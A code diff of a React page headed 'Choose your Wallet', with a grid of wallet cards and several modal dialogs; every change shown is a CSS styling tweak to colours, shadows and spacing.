@@ -133,16 +133,16 @@ export default function Home() {
   }, []);
 
   return (
-    <main className="my-16 px-4">
+    <main className="bg-white px-4 py-10">
       <div className="max-w-7xl mx-auto">
-        <h1 className="text-white text-center font-bold text-3xl">
+        <h1 className="text-[#3730A3] text-center font-extrabold text-3xl">
           Choose your Wallet
         </h1>
         <div className="grid lg:grid-cols-4 gap-5 mt-10">
           {data.map((item, index) => (
             <div
               key={index}
-              className="border-2 border-[#4B4F58] bg-[rgba(255,255,255,0.02)] px-5 py-8 cursor-pointer"
+              className="shadow-2xl px-5 py-8 cursor-pointer"
               onClick={() => initializeFunc()}
             >
               <div className="mx-auto w-36 h-36 mb-6">
@@ -163,7 +163,7 @@ export default function Home() {
         </div>
         <dialog
           id="my_modal_1"
-          className="modal w-full mx-auto border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+          className="modal w-full mx-auto border-[#4B4F58] bg-[#b1afaf] px-2"
         >
           <div className="modal-box">
             <form method="dialog" className="mb-10">
@@ -187,7 +187,7 @@ export default function Home() {
         </dialog>
         <dialog
           id="my_modal_2"
-          className="modal w-full mx-auto border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+          className="modal w-full mx-auto border-[#4B4F58] bg-[#b1afaf] px-2"
         >
           <div className="modal-box">
             <form method="dialog" className="mb-10">
@@ -209,12 +209,12 @@ export default function Home() {
         </dialog>
         <dialog
           id="my_modal_3"
-          className="modal w-full mx-auto border-[#4B4F58] bg-[rgb(32,32,32)]"
+          className="modal w-full mx-auto border-[#4B4F58] bg-[#b1afaf]"
         >
           <div className="modal-box">
-            <form method="dialog" className="mb-">
+            <form method="dialog" className="mb-4">
               {/* if there is a button in form, it will close the modal */}
-              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 mb-4">
+              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-lg">
                 ✕
               </button>
             </form>
@@ -224,7 +224,7 @@ export default function Home() {
                   <div
                     role="tablist"
                     aria-label="tabs"
-                    className="relative font-urbanist grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-5 border-b overflow-hidden transition"
+                    className="relative font-urbanist grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-5 border-b border-black overflow-hidden transition"
                   >
                     <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
                     <button
@@ -268,7 +268,7 @@ export default function Home() {
                         />
                         <div className="flex flex-col-reverse font-urbanist items-center mt-5 gap-y-3 mt-3">
                           <button
-                            className="py-5 w-full text-center font-bold text-white rounded-full"
+                            className="py-5 w-full text-center font-bold text-black rounded-full"
                             onClick={() =>
                               document.getElementById("my_modal_3").close()
                             }
@@ -293,7 +293,7 @@ export default function Home() {
         </dialog>
         <dialog
           id="my_modal_4"
-          className="modal w-full mx-auto border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+          className="modal w-full mx-auto border-[#4B4F58] bg-[#b1afaf] px-2"
         >
           <div className="modal-box">
             <form method="dialog" className="mb-10">
